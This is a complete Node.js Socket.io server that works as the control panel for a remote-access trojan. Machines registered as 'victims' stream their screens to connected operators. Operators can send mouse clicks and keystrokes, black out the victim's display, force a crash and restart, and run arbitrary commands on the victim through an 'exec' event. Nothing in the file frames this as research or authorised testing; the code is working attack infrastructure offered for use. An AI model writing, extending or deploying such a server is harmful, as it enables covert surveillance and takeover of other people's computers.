const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  transports: ["websocket", "polling"],
  cors: { origin: "*" },
  maxHttpBufferSize: 1 * 1024 * 1024,
  pingTimeout: 60000,
  pingInterval: 25000
});

const PORT = process.env.PORT || 8080;

const victims = new Map();
const viewers = new Map();
const frameStreams = new Map();

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "/client.html"));
});

app.get("/healthz", (req, res) => {
  res.status(200).send("OK");
});

io.on("connection", (socket) => {
  console.log(`[+] Connection: ${socket.id}`);

  // ── VICTIM ──
  socket.on("register-victim", (data) => {
    const victimId = data.id || socket.id;
    victims.set(victimId, {
      socket,
      w: data.w || 1920,
      h: data.h || 1080,
      monitors: data.monitors || [],
      connectedAt: Date.now()
    });
    socket.victimId = victimId;
    socket.role = "victim";

    console.log(`[VICTIM ONLINE] ${victimId} (${data.w}x${data.h}, ${(data.monitors || []).length} monitors)`);
    broadcastVictimList();

    socket.on("frame", (frameData) => {
      const stream = frameStreams.get(victimId);
      if (stream && stream.size > 0) {
        const toRemove = [];
        stream.forEach((viewerSocket) => {
          if (viewerSocket.connected) {
            viewerSocket.emit("frame", { victimId, buf: frameData.buf });
          } else {
            toRemove.push(viewerSocket);
          }
        });
        toRemove.forEach(ws => stream.delete(ws));
      }
    });

    socket.on("blackout-status", (data) => {
      const stream = frameStreams.get(victimId);
      if (stream) {
        stream.forEach((vs) => { if (vs.connected) vs.emit("blackout-status", data); });
      }
    });

    socket.on("exec-result", (data) => {
      const stream = frameStreams.get(victimId);
      if (stream) {
        stream.forEach((vs) => { if (vs.connected) vs.emit("exec-result", data); });
      }
    });

    socket.on("disconnect", () => {
      console.log(`[VICTIM OFFLINE] ${victimId}`);
      victims.delete(victimId);
      frameStreams.delete(victimId);
      broadcastVictimList();
    });
  });

  // ── VIEWER ──
  socket.on("register-viewer", () => {
    socket.role = "viewer";
    viewers.set(socket, { viewing: null, currentCrop: null });
    console.log(`[VIEWER ONLINE] ${socket.id}`);
    socket.emit("victim-list", getVictimList());

    socket.on("select-victim", (data) => {
      const victimId = typeof data === "string" ? data : data.id;
      const monitorIndex = data.monitorIndex !== undefined ? data.monitorIndex : null;

      const victim = victims.get(victimId);
      if (!victim) {
        socket.emit("error", { msg: "Victim not available" });
        return;
      }

      // Unsubscribe from previous
      const prev = viewers.get(socket);
      if (prev && prev.viewing) {
        const prevStream = frameStreams.get(prev.viewing);
        if (prevStream) {
          prevStream.delete(socket);
          if (prevStream.size === 0) {
            const oldVictim = victims.get(prev.viewing);
            if (oldVictim && oldVictim.socket.connected) {
              oldVictim.socket.emit("viewer-count", 0);
            }
          }
        }
      }

      // Determine crop info for the victim
      let cropPayload = null;
      let displayW = victim.w;
      let displayH = victim.h;
      let cropOffsetX = 0;
      let cropOffsetY = 0;

      if (monitorIndex !== null && monitorIndex !== undefined) {
        const mons = victim.monitors || [];
        if (monitorIndex >= 0 && monitorIndex < mons.length) {
          const mon = mons[monitorIndex];
          cropPayload = { x: mon.x, y: mon.y, w: mon.w, h: mon.h };
          displayW = mon.w;
          displayH = mon.h;
          cropOffsetX = mon.x;
          cropOffsetY = mon.y;
        }
      }

      // Store current crop info on the viewer entry
      viewers.set(socket, {
        viewing: victimId,
        cropOffsetX,
        cropOffsetY,
        displayW,
        displayH,
        victimW: victim.w,
        victimH: victim.h
      });

      // Subscribe to frame stream
      if (!frameStreams.has(victimId)) {
        frameStreams.set(victimId, new Set());
      }
      frameStreams.get(victimId).add(socket);

      // Tell victim to start/update streaming
      victim.socket.emit("viewer-count", frameStreams.get(victimId).size);
      victim.socket.emit("set-crop", cropPayload);

      // Tell viewer what to expect
      socket.emit("victim-info", {
        id: victimId,
        w: victim.w,
        h: victim.h,
        displayW: displayW,
        displayH: displayH,
        cropOffsetX: cropOffsetX,
        cropOffsetY: cropOffsetY,
        monitors: victim.monitors,
        crop: cropPayload,
        monitorIndex: monitorIndex
      });

      console.log(
        `[VIEWING] ${socket.id} -> ${victimId}` +
        `${monitorIndex !== null ? ` monitor[${monitorIndex}] (${displayW}x${displayH} @ ${cropOffsetX},${cropOffsetY})` : ' full desktop'}`
      );
    });

    socket.on("click", (data) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) return;
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        // Data already has remoteX/remoteY calculated by viewer with crop offset
        victim.socket.emit("click", { x: data.x, y: data.y, btn: data.btn || "left" });
      }
    });

    socket.on("key", (key) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) return;
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("key", key);
      }
    });

    socket.on("toggle-blackout", (state) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) { socket.emit("error", { msg: "No victim selected" }); return; }
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("blackout", state);
      } else {
        socket.emit("error", { msg: "Victim disconnected" });
      }
    });

    socket.on("trigger-crash", () => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) { socket.emit("error", { msg: "No victim selected" }); return; }
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("crash-and-restart");
        socket.emit("system", { msg: "Crash/restart triggered" });
      } else {
        socket.emit("error", { msg: "Victim disconnected" });
      }
    });

    socket.on("exec-victim", (cmd) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) { socket.emit("error", { msg: "No victim selected" }); return; }
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("exec", cmd);
      } else {
        socket.emit("error", { msg: "Victim disconnected" });
      }
    });

    socket.on("get-victims", () => {
      if (socket.role === "viewer") socket.emit("victim-list", getVictimList());
    });

    socket.on("disconnect", () => {
      console.log(`[VIEWER OFFLINE] ${socket.id}`);
      const viewer = viewers.get(socket);
      if (viewer && viewer.viewing) {
        const stream = frameStreams.get(viewer.viewing);
        if (stream) {
          stream.delete(socket);
          if (stream.size === 0) {
            const victim = victims.get(viewer.viewing);
            if (victim) victim.socket.emit("viewer-count", 0);
          }
        }
      }
      viewers.delete(socket);
    });
  });
});

function getVictimList() {
  const list = [];
  for (const [id, victim] of victims) {
    list.push({
      id,
      w: victim.w,
      h: victim.h,
      monitors: victim.monitors,
      connectedAt: victim.connectedAt
    });
  }
  return list;
}

function broadcastVictimList() {
  const list = getVictimList();
  for (const [socket] of viewers) {
    if (socket.connected) socket.emit("victim-list", list);
  }
}

server.listen(PORT, "0.0.0.0", () => {
  console.log(`[SERVER] Listening on http://0.0.0.0:${PORT}`);
});
